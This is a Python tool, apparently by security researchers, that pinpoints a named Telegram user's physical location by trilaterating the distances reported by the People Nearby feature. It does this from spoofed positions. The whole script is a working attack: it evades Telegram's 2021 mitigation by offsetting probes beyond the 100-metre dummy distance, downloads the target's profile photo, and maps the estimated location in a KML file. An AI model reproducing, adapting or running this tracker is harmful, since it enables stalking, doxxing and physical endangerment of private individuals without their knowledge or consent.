#!/usr/bin/env python

# Summary: This scripts gather data from the Telegram people around some coordinates or city
#          Then, it uses the information gathered to geolocate the user using trilateration.
# Authors: Felipe Molina (@felmoltor), Emmanuel Cristofaro (@stutm)
# Date: 2020-12
# Changelog: 
# * 2021-03-11: Trying to bypass Telegram's patch. 
#               They now always return 100 meters if you get too close to the target
#               Now, we have to change the algorithm to be sure we are always farther away from the target than 100 meters.

# Bibliography for the spatial and geographical works in this script
# https://stackoverflow.com/questions/7477003/calculating-new-longitude-latitude-from-old-n-meters
# https://www.usna.edu/Users/oceano/pguth/md_help/html/approx_equivalents.htm#:~:text=1%C2%B0%20%3D%20111%20km%20(or,0.001%C2%B0%20%3D111%20m
# https://pyproj4.github.io/pyproj/
# https://shapely.readthedocs.io/en/stable/manual.html
# https://geographiclib.sourceforge.io/1.49/python/index.html
# https://pypi.org/project/utm/
# https://www.youtube.com/watch?v=1fzQKMp_tdE&list=PL5QWeN4V0w099H8pVXEaCZ5kxnX1aigzH&ab_channel=Enthought
# Google earth: Uses Web Mercator projection (epsg:3857): https://developers.google.com/earth-engine/guides/projections
# https://en.wikipedia.org/wiki/Universal_Transverse_Mercator_coordinate_system
# https://www.youtube.com/watch?v=LcVlx4Gur7I&ab_channel=GIS%26GPSTipsandTechniques
# https://gis.stackexchange.com/questions/325926/buffering-geometry-with-points-in-wgs84-using-shapely
# https://gis.stackexchange.com/questions/260580/working-with-geographic-coordinates-in-shapely
# https://spatialreference.org/ref/epsg/wgs-84/

# General libraries
import os,sys
from pathlib import Path
import csv
from optparse import OptionParser
import math
from time import sleep
from random import randint,uniform
import matplotlib.pyplot as plt
from ColorMessages import *
# Telegram Libraries
from datetime import datetime
from telethon.sync import TelegramClient
from telethon import functions, types
from telethon.tl.types import PeerLocated,PeerChannel,PeerUser
# Geographic Libraries
from geopy.geocoders import Nominatim
from shapely import geometry
import utm
from shapely.geometry import LineString
import simplekml
from polycircles import polycircles

USER_AGENT="Telegram Bot/1.0"
APP_ID="<YOUR APP ID NUMBER>"
APP_HASH="<YOUR APP HASH>"
APP_NAME='My Telegram Test'
COOLDOWN=90         # Cooldown time (in seconds) before asking Telegram again for the same username
FOUND_COOLDOWN=60   # Cooldown time (in seconds) before asking Telegram for a new geo position around the target username
# Since January 2021, Telegram patched the trilateration vulnerability doing this two things:
# * Reduced the number of people you get with the People Nearby functionality, now it only displays user closer than ~2 Km, whereas before you could see people furhter than 6 Km away
# * Return a dummy value of 100 meters when you get too close to your target
# * Use a bigger map grid where the target is positioned in the map. Before, you could have a 10 meters range distance error with your target.
# To be sure that we are not going to receive the dummy distance of 100 meters from the Telegram servers
# We add aproximately 111 meters to the east to our chosen point.
# We use the aproximations proposed on this page: https://www.usna.edu/Users/oceano/pguth/md_help/html/approx_equivalents.htm
# 1° = 111 km
# 0.001° = 111 m
# 0.003° = 333 m
# 0.004° = 444 m
SKEWED_DEGREES=0.003
MOVE_PROBE_ATTEMPTS=3
DUMMY_DISTANCES=[100,111]
GIVEUP_ATTEMPTS=7   # Number of times we will fail to locate a target before cancelling the script
COOLDOWN_BASE=50
MAX_COOLDOWN=400
OK_THRESHOLD=10     # Distance to stop querying Telegram for the target user
CIRCLE_RESOLUTION=180
TARGET_FILE="data/target.csv"
GOOGLE_EARTH_PATH="/usr/bin/google-earth-pro"

class TelegramUser():
    def __init__(self,username=None,user_id=None,first_name=None,last_name=None,distance=None,point=None):
        self.username=username
        self.user_id=user_id
        self.first_name=first_name
        self.last_name=last_name
        self.distance=distance
        self.from_point=point
        self.found=False
        self.latitude=None
        self.longitude=None
        self.photo_path=None

def get_options():
    parser = OptionParser()
    parser.add_option("-l", "--lat", dest="latitude",
                    help="Latitude of your coordinates", default=None)
    parser.add_option("-L", "--long", dest="longitude",
                    help="Longitude of your coordinates", default=None)
    parser.add_option("-c", "--city", dest="city",
                    help="City name or address where you want to locate the Telegram user", default=None)
    parser.add_option("-t", "--target", dest="target",
                    help="Target Telegram username or 'Name Surname'", default=None)
    parser.add_option("-o", "--output", dest="output",
                    help="Output file name", default="data/coordinates.csv")
    parser.add_option("-k", "--kml", dest="kml",
                    help="Output KML path", default="output/target.kml")
    parser.add_option("-q", "--quiet",
                    action="store_false", dest="verbose", default=True,
                    help="don't print status messages to stdout")

    (options, args) = parser.parse_args()
    return options

# This function return the a different cooldown time for each iteration following the exponential backoff retry
def get_cooldown(n):
    return min(MAX_COOLDOWN,COOLDOWN_BASE*(math.pow(2,n-1)))

# Formula extracted from https://stackoverflow.com/questions/7477003/calculating-new-longitude-latitude-from-old-n-meters
# If we get to close to the poles ir radius is very big, this will fail
def getPerimeterPoint(center,dx,dy):
    r_earth = 6378000 # 6378 Km of radius = 6378000 metres
    # Number of Km per degree of longitude
    # (2*math.pi/360) * r_earth * cos(point.latitude)
    # Number of Km per degree of latitude
    # ((2*math.pi)/360) * r_earth = 111 km / degree 
    new_latitude  = center.y  + (dy / r_earth) * (180.0 / math.pi)
    new_longitude = center.x + (dx / r_earth) * (180.0 / math.pi) / math.cos(center.y * math.pi/180.0)
    return geometry.Point(new_latitude,new_longitude)

# This function will return the poligon drawing the circle around the center point with a radius of r
def getCirclePoints(center,radius,resolution=180):
    perimeter_points=[]
    # Iterate through the number of points around the center
    for n in range(1,resolution+1):
        # Divide the 360 degrees of a circle in "resolution" samples
        degree=n*(360.0/resolution)
        dx=math.cos(math.radians(degree))*radius
        dy=math.sin(math.radians(degree))*radius
        ppoint=(getPerimeterPoint(center,dx,dy))
        # print("#%s - Alpha %s: %s,%s" % (n,degree,ppoint.x,ppoint.y))
        perimeter_points.append(ppoint)
    
    poly = geometry.Polygon([[p.x, p.y] for p in perimeter_points])
    return poly

def getUserArray(userID, userDistance, res):
    output = []
    for item in res:
        userInfo = vars(item)
        if userID == userInfo["id"]:
            us = {
                "id":str(userInfo["id"]), 
                "first_name":str(userInfo["first_name"]), 
                "last_name":str(userInfo["last_name"]), 
                "username":str(userInfo["username"]), 
                "phone":str(userInfo["phone"]), 
                "distance":str(userDistance)}
        
    return us

def getCityCoordinates(city):
    try:
        nom = Nominatim(user_agent=USER_AGENT)
        n = nom.geocode(city)
        return n.point
    except Exception as e:
        print(e)
        return None

def getTelegramUserPhoto(user_id=None,username=None):
    ui=None
    fname=None
    if (username is not None):
        ui=username
    elif (user_id is not None):
        ui=int(user_id)
    if (ui is not None):
        result=None
        rnd=randint(1000,9999)
        fname=Path("images/%s_%s.jpg" % (ui,rnd)).absolute()
        with TelegramClient(APP_NAME, APP_ID, APP_HASH) as client:
            client.download_profile_photo(ui,file=fname)
    return fname

def getTelegramData(center,target_username,outfile):
    t = (target_username.upper()).strip()
    target=TelegramUser()
    target.found=False
    target.username=target_username
    now_epoch=int(datetime.now().timestamp())
    # Ask Telegram API for the users around the point "center"
    with TelegramClient(APP_NAME, APP_ID, APP_HASH) as client:
        result = client(functions.contacts.GetLocatedRequest(
            geo_point=types.InputGeoPoint(
                lat=center.y,
                long=center.x
            ),
            self_expires=60
        ))
    peers = result.updates[0].peers
    if (len(peers)>1):
        # Save results in the csv file and check if the target user is in the results
        with open(options.output,"a") as out:
            csvwriter=csv.writer(out,delimiter=",")
            # i = 1 # Starts at one, because element 0 is self and does not contain the user_id attribute
            for currentp in peers:
                if ((currentp.__class__) == PeerLocated):
                    if (currentp.peer.__class__ == PeerUser):
                        userID = currentp.peer.user_id 
                        userDistance = currentp.distance
                        f = getUserArray(userID, userDistance, result.users)
                        data_array=(now_epoch,center.y,center.x,userDistance,userID,f["first_name"],f["last_name"],f["username"],"user")
                        row = "%s,%s,%s,%s,%s,%s,%s,%s,%s" % data_array
                        csvwriter.writerow(data_array)
                        full_name=(f["first_name"]+" "+f["last_name"]).upper().strip()
                        norm_username=(f["username"].upper()).strip()
                        if (t == norm_username or t==full_name):
                            target.found=True
                            target.user_id=f["id"]
                            target.distance=userDistance
                            target.from_point=center
                            target.first_name=f["first_name"]
                            target.last_name=f["last_name"]
                            success("Username %s (%s %s) found %s meters away from %s,%s!" % (target.username,target.first_name,target.last_name,target.distance,center.y,center.x))
                    elif (currentp.peer.__class__ == PeerChannel):
                        channelID = currentp.peer.channel_id 
                        channelDistance = currentp.distance
                        data_array = (now_epoch,center.y,center.x,channelDistance,channelID,"N/A","N/A","N/A","channel")
                        row = "%s,%s,%s,%s,%s,%s,%s,%s,%s" % data_array
                        csvwriter.writerow(data_array)
                        # print(row)
                    else:
                        print("Error. Entity is neither a user nor an channel")
                        pass
    return target

def saveTargetData(target):
    now_epoch=int(datetime.now().timestamp())
    with open(TARGET_FILE,"a") as out:
        csvwriter=csv.writer(out,delimiter=",")
        data_array=(now_epoch,target.from_point.y,target.from_point.x,target.distance,target.first_name,target.last_name,target.username)
        csvwriter.writerow(data_array)

def drawTargetKml(kml_file,target,potential_location,open_kml=True):
    kml=simplekml.Kml()
    with open(TARGET_FILE,"r") as csv_file:
        csv_reader = csv.reader(csv_file, delimiter=',')

        measure_n=0
        for row in csv_reader:
            measure_n+=1
            # (now_epoch,target.from_point.y,target.from_point.x,target.distance,target.first_name,target.last_name,target.username)
            full_name=row[4]+" "+row[5]
            username=row[6]
        
            lat=float(row[1])
            lon=float(row[2])
            distance=int(row[3])
            label=username
            if (username.lower() == "none"):
                label=full_name
            
            polycircle = polycircles.Polycircle(latitude=lat,
                                        longitude=lon,
                                        radius=distance,
                                        number_of_vertices=CIRCLE_RESOLUTION)
            
            pol = kml.newpolygon(name="[%s] Distance to %s (%s)" % (measure_n,username,full_name),outerboundaryis=polycircle.to_kml())
            pol.style.polystyle.color = simplekml.Color.changealphaint(100, simplekml.Color.green)
    
    point_name=None
    if (target.username is not None):
        point_name=target.username
    elif (target.first_name is not None):
        point_name=target.first_name+" "+target.last_name
    else:
        point_name="Unknown User"
    target_point=kml.newpoint(name=point_name)
    target_point.coords=[(potential_location.x,potential_location.y)]
    target_point.description='%s %s<br/><img src="%s" alt="Target Photo" align="left" width=250 height=250 />' % (target.first_name,target.last_name,str(target.photo_path))
    kml.save(kml_file)

    # If open is true, open with Google Earth
    if (open_kml):
        if (os.path.exists(GOOGLE_EARTH_PATH)):
            os.system('xdg-open %s' % kml_file)
        else:
            error("Google Earth path not found. Open the file '%s' manually to see the location of the target.")

def moveCloser(current_probe_point,last_success_point):
    dx=current_probe_point.x-last_success_point.x
    dy=current_probe_point.y-last_success_point.y
    # Get a random point 
    rndx=uniform(0.0,dx)
    rndy=uniform(0.0,dy)
    p=geometry.Point(current_probe_point.x-rndx,current_probe_point.y-rndy)
    return p

# This function search for a user around a point. Every time we fail to locate a user, the time we wait for the next
# interaction with Telegram will double. If we fail more than a number of times to locate the user, we try to move 
# our probe to a coordinates closer to the last point where we found the target user.
# This function will discard the results if we receive the exact same distance to our target user that we had in our
# last interaction with Telegram and wait for a few seconds to try again to contact Telegram.
# Parameters:
# * init_point: Point where we tell Telegram we are located at
# * username: Target Telegram username
# * output: Output file to store the CSV results retrieved form Telegram
# * previous_distance: The distance to the target user we got in our previous interaction with Telegram
# * move_attempts: The number of attemps we will take before giving up and moving our own possition
# * last_success_point: Last point where we were able to locate the target user
def searchUserAround(init_point,username,output,previous_distance=None,move_attempts=None,last_success_point=None):
    current_probe_point=init_point
    count=0
    target=None
    # Iterate until the target user is found on the peer list and the distance is different to the previous received from Telegram
    while ((target is None or not target.found) 
    or (previous_distance is not None and target.distance == previous_distance) 
    and (move_attempts is not None and count<=move_attempts)):
        count+=1
        target=getTelegramData(current_probe_point,username,output)
        c=get_cooldown(count)
        if (not target.found):
            warning("#%s Target not found. Sleeping %s seconds" % (count,c))
            sleep(c)
            
            # Check if we have reached maximum number of attempts
            if (move_attempts is not None and count>move_attempts):
                error("Reached maximum attempts to locate the user (%s)." % move_attempts)
                if (last_success_point is not None):                  
                    current_probe_point=moveCloser(current_probe_point,last_success_point)
                    error("Moving our own position closer to a previous point. New probe is in %s,%s" % (current_probe_point.y,current_probe_point.x))  
                else:
                    error("No previous successful position known. Giving up.")
                    break
        elif (target.distance == previous_distance and not (target.distance in DUMMY_DISTANCES)):
            warning("Telegram returned the same distance as in the previous interaction. Waiting %s seconds to try again." % c)
            sleep(c)
        
    return target

################

if __name__ == "__main__":
    options=get_options()
    init_point=None
    if (options.city is not None):
        p=getCityCoordinates(options.city)
        if (p is not None):
            init_point=geometry.Point([float(p.longitude),float(p.latitude)])
        else:
            error("Error accessing GeoPy API. Try using latitude and longitude (-l and -L flags)")
            sys.exit()
    elif (options.latitude is not None and options.longitude is not None):
        # Coordinates
        init_point=geometry.Point([float(options.longitude),float(options.latitude)]) # x,y
    else:
        error("Error. You have to specify at least an address/city (-c) or coordinates (-l and -L).")

    info("Searching for user '%s' on %s,%s" % (options.target,init_point.y,init_point.x))
    # Delete old targets data
    if (os.path.exists(TARGET_FILE)):
        os.remove(TARGET_FILE)

    # #1 Search the user for the first time
    target=searchUserAround(init_point,options.target,options.output)

    # Get target user photo by user_id
    target_photo=None
    if (target.user_id is not None):
        target_photo=getTelegramUserPhoto(user_id=target.user_id)
        info("Profile picture of '%s' saved in %s" % (options.target,target_photo))

    # We have found the target username
    # Now, calculate a new coordinate point on the perimeter of the circle to ask Telegram API
    first_circle=getCirclePoints(target.from_point,target.distance,resolution=CIRCLE_RESOLUTION)
    # Save data into the target file
    saveTargetData(target)

    # Pick a random point of the perimeter
    r = randint(0,CIRCLE_RESOLUTION)
    random_point=first_circle.exterior.coords[r]
    new_center=geometry.Point(random_point[1],random_point[0]) # X (longitude) is in position 1, Y (latitude) is in position 0

    # #2 Search the user for the second time
    target=searchUserAround(new_center,options.target,options.output,previous_distance=target.distance,move_attempts=MOVE_PROBE_ATTEMPTS,last_success_point=target.from_point)

    # We have found the target username for the second time
    # Now, intersect this circle with the previous one
    second_circle=getCirclePoints(target.from_point,target.distance,resolution=CIRCLE_RESOLUTION)
    # Save data into the target file
    saveTargetData(target)

    # Intersect first and secod circles and choose randomly between one of the two points of the intersection
    # https://gis.stackexchange.com/questions/318325/intersection-function-returns-multiple-coordinates
    third_center = None
    fourth_center = None
    chosen_point=None
    discarded_point=None
    if (first_circle.intersects(second_circle)):
        circle1_points=LineString(list(first_circle.exterior.coords))
        circle2_points=LineString(list(second_circle.exterior.coords))
        inter=circle1_points.intersection(circle2_points)
        # Choose between two intersection points randomly to ask again to Telegram
        cp=randint(0,1) # Chosen random point
        dp=(cp-1)%2     # Discarded point
        chosen_point=inter[cp] 
        discarded_point=inter[dp] 
        third_center=geometry.Point(chosen_point.y,chosen_point.x) # intersection returns the point coordinates switched
        fourth_center=geometry.Point(discarded_point.y,discarded_point.x) # intersection returns the point coordinates switched
    else:
        error("Error. Circles don't intersect. Maybe the target has moved?")

    # #3 Search the user for the third time
    target=searchUserAround(third_center,options.target,options.output,previous_distance=target.distance,move_attempts=MOVE_PROBE_ATTEMPTS,last_success_point=target.from_point)
    # After Januar 2021, Telegram uses a dummy value of 100 meters when you are too close to the target.
    # We are going to check if we are 100 meters from the target. If so, this is the potential location of the user
    potential_location=None
    if (target.distance in DUMMY_DISTANCES):
        success("Potential target location found in %s,%s!" % (third_center.y,third_center.x))
        potential_location=third_center
        # Now, move to a new point in the map more than 100 meters away from this third center and ask again to Telegram
        third_center=geometry.Point(third_center.x+SKEWED_DEGREES,third_center.y)
        target=searchUserAround(third_center,options.target,options.output,previous_distance=target.distance,move_attempts=MOVE_PROBE_ATTEMPTS,last_success_point=target.from_point)

    third_circle=getCirclePoints(target.from_point,target.distance,resolution=CIRCLE_RESOLUTION)
    # Save data into the target file
    saveTargetData(target)

    # #4 Search the user for the fourth time
    target=searchUserAround(fourth_center,options.target,options.output,previous_distance=target.distance,move_attempts=MOVE_PROBE_ATTEMPTS,last_success_point=target.from_point)
    # After January 2021, Telegram uses a dummy value of 100 meters when you are too close to the target.
    # We are going to check if we are 100 meters from the target. If so, this is the potential location of the user
    if (target.distance in DUMMY_DISTANCES):
        success("Potential target location found in %s,%s!" % (fourth_center.y,fourth_center.x))
        potential_location=fourth_center
        # Now, move to a new point in the map more than 100 meters away from this third center and ask again to Telegram
        fourth_center=geometry.Point(fourth_center.x+SKEWED_DEGREES,fourth_center.y)
        target=searchUserAround(fourth_center,options.target,options.output,previous_distance=target.distance,move_attempts=MOVE_PROBE_ATTEMPTS,last_success_point=target.from_point)

    fourth_circle=getCirclePoints(target.from_point,target.distance,resolution=CIRCLE_RESOLUTION)
    # Save data into the target file
    saveTargetData(target)

    # Draw circle 1, 2 and 3
    (x,y)=first_circle.exterior.xy
    (x2,y2)=second_circle.exterior.xy
    (x3,y3)=third_circle.exterior.xy
    (x4,y4)=fourth_circle.exterior.xy
    plt.plot(x,y)
    plt.plot(x2,y2)
    plt.plot(x3,y3)
    plt.plot(x4,y4)
    plt.xlabel="Latitude"
    plt.ylabel="Longitude"
    plt.show()
    
    info("Generating the result KML file")
    target.photo_path=target_photo
    drawTargetKml(options.kml,target,potential_location,open_kml=True)

